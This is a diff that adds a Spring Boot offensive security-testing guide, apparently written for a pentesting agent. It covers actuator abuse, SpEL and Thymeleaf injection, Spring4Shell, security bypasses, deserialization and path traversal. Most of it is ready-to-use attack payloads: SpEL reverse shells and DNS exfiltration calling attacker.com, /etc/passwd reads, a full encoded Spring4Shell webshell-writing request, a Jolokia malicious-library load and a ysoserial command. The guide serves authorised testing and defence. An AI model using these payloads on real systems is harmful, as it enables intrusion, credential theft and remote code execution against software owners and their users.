@@ -1,0 +1,676 @@
+<spring_boot_security_guide>
+<title>SPRING BOOT SECURITY TESTING</title>
+
+<critical>Spring Boot applications have framework-specific vulnerabilities including actuator endpoint exposure, SpEL injection, Spring4Shell patterns, bean manipulation, property injection, and Thymeleaf SSTI. Focus on misconfigured actuators, expression language injection, and deserialization issues.</critical>
+
+<scope>
+- Actuator endpoint exposure and exploitation
+- SpEL (Spring Expression Language) injection
+- Spring4Shell (CVE-2022-22965) patterns
+- Bean manipulation and injection
+- Property injection (@Value vulnerabilities)
+- Thymeleaf Server-Side Template Injection (SSTI)
+- Spring Security bypass techniques
+- Deserialization vulnerabilities
+- Path traversal in static resources
+</scope>
+
+<methodology>
+1. Identify Spring Boot version and dependencies
+2. Enumerate actuator endpoints
+3. Test SpEL injection in all input vectors
+4. Check for Spring4Shell vulnerability patterns
+5. Probe @RequestParam and @Value for injection
+6. Test Thymeleaf templates for SSTI
+7. Analyze Spring Security configuration
+8. Test deserialization in sessions and caching
+</methodology>
+
+<actuator_exposure>
+<endpoint_enumeration>
+{% raw %}
+# Spring Boot Actuator endpoints
+
+# Common paths:
+/actuator
+/actuator/health
+/actuator/info
+/actuator/metrics
+/actuator/env
+/actuator/beans
+/actuator/mappings
+/actuator/configprops
+/actuator/threaddump
+/actuator/heapdump
+/actuator/loggers
+/actuator/trace
+/actuator/httptrace
+/actuator/auditevents
+/actuator/sessions
+/actuator/shutdown
+
+# Legacy paths (Spring Boot 1.x):
+/health
+/info
+/metrics
+/env
+/beans
+/mappings
+/dump
+/trace
+/loggers
+/heapdump
+
+# Bruteforce endpoints:
+endpoints = [
+    'actuator', 'actuator/health', 'actuator/env',
+    'actuator/beans', 'actuator/metrics', 'actuator/heapdump',
+    'management', 'management/health', 'admin',
+    'api/actuator', 'api/health'
+]
+for endpoint in endpoints:
+    GET /{endpoint}
+{% endraw %}
+</endpoint_enumeration>
+
+<sensitive_data_exposure>
+{% raw %}
+# Actuator endpoints with sensitive data
+
+# /actuator/env - Environment variables
+GET /actuator/env
+# Response may include:
+# - Database credentials
+# - API keys
+# - Secret tokens
+# - AWS credentials
+# - SMTP passwords
+
+# /actuator/configprops - Configuration properties
+GET /actuator/configprops
+# Reveals:
+# - Application config
+# - Bean properties
+# - May include passwords
+
+# /actuator/beans - All Spring beans
+GET /actuator/beans
+# Shows:
+# - Bean definitions
+# - Dependencies
+# - Internal structure
+
+# /actuator/mappings - All endpoints
+GET /actuator/mappings
+# Lists all request mappings
+# Reveals hidden endpoints
+# Shows parameter names
+
+# /actuator/heapdump - Memory dump
+GET /actuator/heapdump
+# Downloads heap dump file
+# May contain:
+# - Passwords in memory
+# - Session tokens
+# - Encryption keys
+# - User data
+
+# Parse heapdump:
+jvisualvm heapdump.hprof
+# Or use Eclipse MAT
+
+# /actuator/httptrace - HTTP requests
+GET /actuator/httptrace
+# Recent HTTP requests with:
+# - URLs
+# - Headers (may include Authorization)
+# - Timestamps
+
+# /actuator/loggers - Logger configuration
+GET /actuator/loggers
+# Can change log levels:
+POST /actuator/loggers/root
+{"configuredLevel": "TRACE"}
+# Enable verbose logging for debugging/info disclosure
+{% endraw %}
+</sensitive_data_exposure>
+
+<actuator_exploitation>
+{% raw %}
+# Exploit actuator endpoints
+
+# Change log level for debugging:
+POST /actuator/loggers/com.example.app
+{
+  "configuredLevel": "DEBUG"
+}
+# May expose sensitive info in logs
+
+# Shutdown application (if enabled):
+POST /actuator/shutdown
+{}
+# DoS
+
+# Restart with different properties:
+POST /actuator/restart
+# If combined with property manipulation
+
+# Jolokia JMX (if available):
+GET /actuator/jolokia
+# Access JMX beans
+# Potential RCE via MBean operations
+
+# Jolokia RCE:
+POST /actuator/jolokia
+{
+  "type": "exec",
+  "mbean": "java.lang:type=Memory",
+  "operation": "gc"
+}
+
+# Or load malicious MBean:
+{
+  "type": "exec",
+  "mbean": "java.lang:type=Runtime",
+  "operation": "loadLibrary",
+  "arguments": ["/path/to/malicious.so"]
+}
+{% endraw %}
+</actuator_exploitation>
+</actuator_exposure>
+
+<spel_injection>
+<concept>
+{% raw %}
+# SpEL = Spring Expression Language
+# Powerful expression evaluation
+# Can execute arbitrary code if user input not sanitized
+
+# Syntax:
+#{expression}  // Template mode
+${expression}  // Property placeholder
+
+# Example vulnerable code:
+@GetMapping("/hello")
+public String hello(@RequestParam String name) {
+    ExpressionParser parser = new SpelExpressionParser();
+    Expression exp = parser.parseExpression(name);
+    return exp.getValue().toString();
+}
+
+# Attack:
+GET /hello?name=#{T(java.lang.Runtime).getRuntime().exec('id')}
+{% endraw %}
+</concept>
+
+<injection_vectors>
+{% raw %}
+# Common SpEL injection points
+
+# 1. @RequestParam/@PathVariable
+@GetMapping("/user/{id}")
+public User getUser(@PathVariable String id) {
+    // If id used in SpEL expression
+}
+
+# 2. @Value annotation with user input
+@Value("#{request.getParameter('theme')}")
+private String theme;
+
+# 3. Spring Data JPA queries
+@Query("... where name = :#{#name}")
+User findByName(@Param("name") String name);
+
+# 4. Spring Security expressions
+@PreAuthorize("hasRole(#{request.getParameter('role')})")
+public void action() { }
+
+# 5. Thymeleaf templates
+<div th:text="${param.message}"></div>
+# If message contains SpEL
+
+# 6. Custom expression evaluation
+ExpressionParser parser = new SpelExpressionParser();
+Expression exp = parser.parseExpression(userInput);
+{% endraw %}
+</injection_vectors>
+
+<payloads>
+{% raw %}
+# SpEL RCE payloads
+
+# Basic execution:
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+
+# Read file:
+#{T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}
+
+# Write file:
+#{T(java.nio.file.Files).write(T(java.nio.file.Paths).get('/tmp/shell.sh'),T(java.lang.String).valueOf('#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/4444 0>&1').getBytes())}
+
+# DNS exfiltration:
+#{T(java.net.InetAddress).getByName('data.attacker.com')}
+
+# Reverse shell:
+#{T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','bash -i >& /dev/tcp/attacker.com/4444 0>&1'})}
+
+# Process Builder:
+#{new java.lang.ProcessBuilder({'bash','-c','id'}).start()}
+
+# URL encoding for HTTP:
+%23%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27id%27%29%7D
+
+# Bypass T() restriction:
+# Use reflection
+#{new java.lang.ProcessBuilder(new java.lang.String[]{'id'}).start()}
+
+# Access application context:
+#{@applicationContext}
+#{@environment}
+
+# Access beans:
+#{@userService.findById(1).password}
+#{@dataSource.getConnection()}
+
+# Reflection-based RCE:
+#{T(org.springframework.util.ReflectionUtils).findMethod(T(java.lang.Runtime),'getRuntime').invoke(null).exec('id')}
+{% endraw %}
+</payloads>
+
+<detection>
+{% raw %}
+# Detect SpEL injection
+
+# Test basic math:
+#{7*7}
+${7*7}
+# If returns 49 -> vulnerable
+
+# Test class access:
+#{T(java.lang.System).getProperty('java.version')}
+# Returns Java version
+
+# Error-based detection:
+#{invalid_syntax}
+# SpEL parsing error reveals vulnerability
+
+# Time-based:
+#{T(java.lang.Thread).sleep(5000)}
+# 5 second delay
+
+# DNS callback:
+#{T(java.net.InetAddress).getByName('test.burpcollaborator.net')}
+# Check DNS logs
+{% endraw %}
+</detection>
+</spel_injection>
+
+<spring4shell>
+<vulnerability>
+{% raw %}
+# CVE-2022-22965: Spring4Shell
+# RCE via class loader manipulation
+
+# Affected versions:
+# Spring Framework 5.3.0 to 5.3.17
+# Spring Framework 5.2.0 to 5.2.19
+# (and earlier)
+
+# Requirements:
+# - JDK 9+
+# - Apache Tomcat as servlet container
+# - Spring parameter binding
+# - WAR deployment
+
+# Concept:
+# Exploit nested property binding to access class.module.classLoader
+# Modify Tomcat settings to write webshell
+{% endraw %}
+</vulnerability>
+
+<exploitation>
+{% raw %}
+# Spring4Shell exploit
+
+# Step 1: Set access log pattern
+POST /vulnerable-endpoint
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+
+# Step 2: Trigger access log write
+GET /
+
+# Step 3: Access webshell
+GET /shell.jsp?pwd=j&cmd=id
+
+# Simpler PoC:
+POST /
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=test
+class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
+class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+
+# Detection:
+# Try to access class.module.classLoader
+# If no error -> potentially vulnerable
+{% endraw %}
+</exploitation>
+</spring4shell>
+
+<property_injection>
+<value_annotation>
+{% raw %}
+# @Value annotation injection
+
+# Vulnerable code:
+@Value("${user.role:#{request.getParameter('role')}}")
+private String userRole;
+
+# Attack:
+GET /endpoint?role=#{T(java.lang.Runtime).getRuntime().exec('id')}
+
+# Or property file injection:
+# If application.properties writable:
+GET /actuator/env
+POST /actuator/env
+{
+  "name": "malicious.property",
+  "value": "#{T(java.lang.Runtime).getRuntime().exec('id')}"
+}
+
+# Then trigger property refresh
+POST /actuator/refresh
+{% endraw %}
+</value_annotation>
+
+<property_binding>
+{% raw %}
+# Spring property binding
+
+# Vulnerable pattern:
+@PostMapping("/config")
+public void updateConfig(@ModelAttribute Config config) {
+    // config object populated from request params
+}
+
+# Attack: Nested property access
+POST /config
+config.class.module.classLoader=...
+
+# Or:
+POST /config
+config.environment.systemProperties[malicious_key]=malicious_value
+
+# Property traversal:
+config.parent.someProperty=value
+config[someKey]=value
+{% endraw %}
+</property_binding>
+</property_injection>
+
+<thymeleaf_ssti>
+<injection_points>
+{% raw %}
+# Thymeleaf template injection
+
+# Vulnerable patterns:
+
+# 1. Fragment expressions:
+<div th:replace="'fragments/' + ${param.page}"></div>
+# Attack: param.page=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%27id%27).getInputStream()).useDelimiter(%27\\A%27).next()%7d__::.x
+
+# 2. Inline expressions:
+<div>Welcome [[${param.name}]]</div>
+# Attack: param.name=__$%7bT(java.lang.Runtime).getRuntime().exec('id')%7d__
+
+# 3. Expression preprocessing:
+<div th:text="${__${param.expr}__}"></div>
+# Attack: param.expr=T(java.lang.Runtime).getRuntime().exec('id')
+
+# 4. Template name from param:
+return "template_" + param.name;
+# Attack: param.name=__$%7b...%7d__
+
+# 5. Path traversal in template:
+return new ModelAndView("user/" + userId);
+# Attack: userId=../../malicious
+{% endraw %}
+</injection_points>
+
+<payloads>
+{% raw %}
+# Thymeleaf SSTI payloads
+
+# Basic RCE:
+__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+
+# URL encoded:
+__$%7bT(java.lang.Runtime).getRuntime().exec('id')%7d__::.x
+
+# New syntax (expression preprocessing):
+__#{T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+
+# Read file:
+__${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/etc/passwd'))}__::.x
+
+# Spring expression:
+__${@applicationContext.getBean('userService').findAll()}__::.x
+
+# Detection payload:
+__${7*7}__::.x
+# Returns: 49
+
+# Template fragment:
+~{__${T(java.lang.Runtime).getRuntime().exec('id')}__}
+
+# Inline evaluation:
+[(__${T(java.lang.Runtime).getRuntime().exec('id')}__)]
+{% endraw %}
+</payloads>
+</thymeleaf_ssti>
+
+<spring_security_bypass>
+<path_matching>
+{% raw %}
+# Path matching bypass
+
+# Security config:
+http.authorizeRequests()
+    .antMatchers("/admin/**").hasRole("ADMIN")
+    .anyRequest().permitAll();
+
+# Bypass attempts:
+
+# 1. Path traversal:
+/admin/../public/sensitive
+/./admin/panel
+
+# 2. URL encoding:
+/%61dmin/panel  (URL encode 'a')
+/admin%2fpanel  (URL encode '/')
+
+# 3. Double encoding:
+/%2561dmin/panel
+
+# 4. Case manipulation (if case-insensitive):
+/Admin/panel
+/ADMIN/panel
+
+# 5. Trailing slash:
+/admin vs /admin/
+
+# 6. Matrix variables:
+/admin;x=y/panel
+
+# 7. Request method:
+# GET /admin -> protected
+# POST /admin -> check if also protected
+
+# 8. Content-Type bypass:
+# May have different auth for JSON vs form
+Content-Type: application/json
+vs
+Content-Type: application/x-www-form-urlencoded
+{% endraw %}
+</path_matching>
+
+<method_security_bypass>
+{% raw %}
+# Method-level security bypass
+
+# @PreAuthorize annotation:
+@PreAuthorize("hasRole('ADMIN')")
+public void adminAction() { }
+
+# Bypass attempts:
+
+# 1. Call via different endpoint:
+# /admin/action (protected)
+# /api/action (same method, unprotected)
+
+# 2. Direct bean access (if exposed):
+@Autowired
+private AdminService adminService;
+adminService.adminAction();  // Bypasses @PreAuthorize
+
+# 3. Reflection:
+Method method = AdminService.class.getMethod("adminAction");
+method.invoke(adminServiceBean);
+
+# 4. SpEL injection in @PreAuthorize:
+@PreAuthorize("hasRole(#{request.getParameter('role')})")
+# Inject SpEL
+{% endraw %}
+</method_security_bypass>
+</spring_security_bypass>
+
+<deserialization>
+<java_deserialization>
+{% raw %}
+# Java deserialization in Spring
+
+# Common locations:
+# - Session cookies (if not using JSON)
+# - Redis cache
+# - HTTP Invoker
+# - JMX
+
+# Session cookie deserialization:
+Cookie: JSESSIONID=<serialized_data>
+# If Java serialization used
+
+# Attack with ysoserial:
+java -jar ysoserial.jar CommonsCollections6 'id' | base64
+
+# Inject in cookie/parameter
+
+# HTTP Invoker (deprecated but still used):
+POST /remoting/myService
+Content-Type: application/x-java-serialized-object
+<serialized_payload>
+
+# Redis deserialization:
+# If Spring Data Redis with JdkSerializationRedisSerializer
+# Poisoned cache entry causes RCE on retrieval
+
+# Detection:
+# Look for Java serialization magic bytes:
+# 0xACED0005 (hex)
+# rO0AB (base64)
+
+# Check Content-Type:
+application/x-java-serialized-object
+{% endraw %}
+</java_deserialization>
+</deserialization>
+
+<path_traversal>
+<static_resources>
+{% raw %}
+# Path traversal in static resources
+
+# Spring Boot serves static files from:
+# - /static
+# - /public
+# - /resources
+# - /META-INF/resources
+
+# Vulnerable if custom handling:
+@GetMapping("/files/{filename}")
+public ResponseEntity<Resource> getFile(@PathVariable String filename) {
+    Resource file = storageService.loadFile(filename);
+    return ResponseEntity.ok(file);
+}
+
+# Attack:
+GET /files/../../application.properties
+GET /files/../../../../etc/passwd
+
+# URL encoding:
+GET /files/..%2f..%2fapplication.properties
+GET /files/%2e%2e%2f%2e%2e%2fapplication.properties
+
+# Double encoding:
+GET /files/%252e%252e%252fapplication.properties
+
+# Check for:
+# - application.properties (contains secrets)
+# - application.yml
+# - logback.xml
+# - pom.xml (dependencies/versions)
+# - src/main/resources/*
+{% endraw %}
+</static_resources>
+</path_traversal>
+
+<validation>
+1. Demonstrate actuator endpoint access (retrieve credentials from /actuator/env)
+2. Prove SpEL injection with code execution
+3. Show Spring4Shell exploitation (if applicable)
+4. Thymeleaf SSTI with RCE payload
+5. Spring Security bypass (access protected endpoint)
+6. Property injection leading to RCE
+7. Path traversal to sensitive files
+8. Provide reproducible HTTP requests
+</validation>
+
+<false_positives>
+- Actuator endpoints properly secured (authentication required)
+- SpEL expressions sanitized or avoided with user input
+- Spring Security properly configured with no bypass
+- Thymeleaf expressions properly escaped
+- Java deserialization disabled
+- Path traversal validation on file operations
+- Updated to patched Spring versions
+</false_positives>
+
+<impact>
+- Remote code execution (SpEL, SSTI, deserialization, Spring4Shell)
+- Credential exposure (actuator endpoints)
+- Authentication bypass (Spring Security flaws)
+- Information disclosure (actuator, logs)
+- DoS (actuator shutdown)
+- Path traversal (sensitive file access)
+- Session hijacking (insecure cookies)
+</impact>
+
+<pro_tips>
+1. Always check /actuator and legacy endpoints first
+2. SpEL injection is critical—test all expression contexts
+3. Heapdump downloads can contain passwords in memory
+4. Spring4Shell affects Tomcat deployments with JDK 9+
+5. Thymeleaf preprocessing is powerful injection vector
+6. /actuator/mappings reveals all hidden endpoints
+7. Property injection can chain to SpEL execution
+8. Test both Spring MVC and Spring Security path matching
+9. Java deserialization often in session management
+10. Actuator /env can be modified in some configs
+11. Check for Spring Cloud Config Server exposure
+12. Spring Boot DevTools should never be in production
+13. H2 console (if enabled) provides SQL access
+14. Test different Content-Types for auth bypass
+15. Jolokia JMX endpoint is high-value RCE target
+</pro_tips>
+
+<remember>Spring Boot's convenience features become security risks when misconfigured. Actuator endpoints are gold mines for reconnaissance and credential theft. SpEL injection is as powerful as code execution—test every expression context. Spring4Shell is still relevant in legacy systems. Thymeleaf SSTI requires expression preprocessing syntax. Spring Security path matching has many edge cases and bypass opportunities. Java deserialization in sessions is still common. Property injection can chain to expression evaluation. Always enumerate actuator endpoints—they're often completely exposed. Heapdump files contain everything in memory including secrets.</remember>
+</spring_boot_security_guide>
